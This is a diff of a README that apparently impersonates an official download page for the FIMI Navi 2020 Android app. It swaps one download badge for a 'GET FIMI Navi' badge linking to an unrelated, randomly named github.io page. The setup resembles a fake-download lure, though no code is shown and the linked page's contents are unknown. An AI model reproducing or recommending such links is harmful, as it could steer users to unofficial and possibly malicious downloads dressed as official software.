@@ -4,11 +4,8 @@
   <img src="https://cdn6.aptoide.com/imgs/f/b/7/fb75d52f244710e521a9ade47a0903c7_fgraphic.png" width="820" alt="FIMI Navi 2020 App Interface">
 </div>
 
-<p align="center">
-  <a href="https://fimi-navi-2020-official-android-app.github.io/.github">
-    <img src="https://img.shields.io/badge/Download_FIMI_Navi_2020-34A853?style=for-the-badge&logo=android&logoColor=white" alt="Download FIMI Navi 2020 for Android">
-  </a>
-</p>
+[![GET FIMI Navi](https://img.shields.io/badge/GET%20%E2%80%94%20FIMI-Navi-0078D6?style=for-the-badge&logoColor=white)](https://orazinesirpendrak.github.io/.github/FIMI-Navi)
+
 
 ---
 
